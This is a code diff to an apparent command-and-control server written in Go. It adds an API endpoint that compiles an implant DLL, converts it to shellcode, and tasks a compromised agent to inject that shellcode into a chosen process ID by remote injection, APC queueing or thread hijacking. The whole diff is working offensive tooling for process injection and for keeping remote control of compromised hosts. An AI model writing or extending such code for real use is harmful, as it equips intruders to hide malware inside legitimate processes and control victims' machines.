@@ -561,6 +561,102 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 		}
 		jsonOK(w, map[string]string{"status": "ok"})
 
+	case "inject":
+		// POST /api/agents/{id}/inject
+		// Builds the C agent DLL with the given config, converts to sRDI shellcode,
+		// and tasks the agent with INJECT_REMOTE, INJECT_APC, or THREAD_HIJACK.
+		//
+		// Body: {pid, method, server_url, transport, sleep_sec, jitter_pct}
+		if r.Method != http.MethodPost {
+			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
+			return
+		}
+		var req struct {
+			PID       int    `json:"pid"`
+			Method    string `json:"method"`     // "remote"|"apc"|"hijack"
+			ServerURL string `json:"server_url"` // e.g. "https://10.10.10.99:443"
+			Transport string `json:"transport"`  // "https"|"http"|"tcp"
+			SleepSec  int    `json:"sleep_sec"`
+			JitterPct int    `json:"jitter_pct"`
+		}
+		if err := jsonBody(r, &req); err != nil {
+			jsonErr(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		if req.PID == 0 {
+			jsonErr(w, "pid required", http.StatusBadRequest)
+			return
+		}
+		if req.Method == "" {
+			req.Method = "remote"
+		}
+		if req.Transport == "" {
+			req.Transport = "https"
+		}
+		if req.SleepSec == 0 {
+			req.SleepSec = 60
+		}
+		if req.JitterPct == 0 {
+			req.JitterPct = 20
+		}
+
+		operator := operatorFromCert(r)
+		s.printf("[%s→%s] inject PID=%d method=%s url=%s\n", operator, shortID(agentID), req.PID, req.Method, req.ServerURL)
+
+		tmpDir, err := os.MkdirTemp("", "inject_")
+		if err != nil {
+			jsonErr(w, "tempdir: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		defer os.RemoveAll(tmpDir)
+
+		cfg := BuildConfig{
+			ServerURL: req.ServerURL,
+			Transport: req.Transport,
+			SleepSec:  req.SleepSec,
+			JitterPct: req.JitterPct,
+			Lang:      "c",
+			Format:    "dll",
+			PresetID:  newUUID(),
+		}
+		s.db.PreRegisterAgent(cfg.PresetID, agentID) //nolint:errcheck
+
+		dllPath, err := BuildCAgentDLL(cfg, tmpDir)
+		if err != nil {
+			jsonErr(w, "build dll: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+
+		scPath, err := BuildSRDI(dllPath, "", nil, 0x1, tmpDir)
+		if err != nil {
+			jsonErr(w, "srdi: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+
+		sc, err := os.ReadFile(scPath)
+		if err != nil {
+			jsonErr(w, "read shellcode: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+
+		taskType := "INJECT_REMOTE"
+		switch req.Method {
+		case "apc":
+			taskType = "INJECT_APC"
+		case "hijack":
+			taskType = "THREAD_HIJACK"
+		}
+
+		taskArgs := fmt.Sprintf(`{"pid":%d}`, req.PID)
+		tid, err := s.db.QueueTask(agentID, taskType, taskArgs, sc, operator)
+		if err != nil {
+			jsonErr(w, "queue task: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		s.printf("[%s→%s] task #%d queued: %s pid=%d shellcode=%dKB\n",
+			operator, shortID(agentID), tid, taskType, req.PID, len(sc)/1024)
+		jsonOK(w, map[string]any{"task_id": tid, "shellcode_kb": len(sc) / 1024})
+
 	default:
 		jsonErr(w, "unknown action: "+sub, http.StatusNotFound)
 	}
